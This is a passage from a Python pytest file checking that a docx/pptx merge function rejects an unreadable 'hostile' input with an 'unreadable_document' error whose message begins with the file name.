    other = docx_bytes("Other") if kind == "docx" else deck_bytes("Other")
    other_name = "b.docx" if kind == "docx" else "b.pptx"
    parts = [DocumentMergePart("a", name, lambda: hostile), DocumentMergePart("b", other_name, lambda: other)]
    with pytest.raises(DocumentMergeError) as refused:
        merge_documents(kind, parts)
    assert refused.value.code == "unreadable_document"
    assert str(refused.value).startswith(name)


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-q"]))
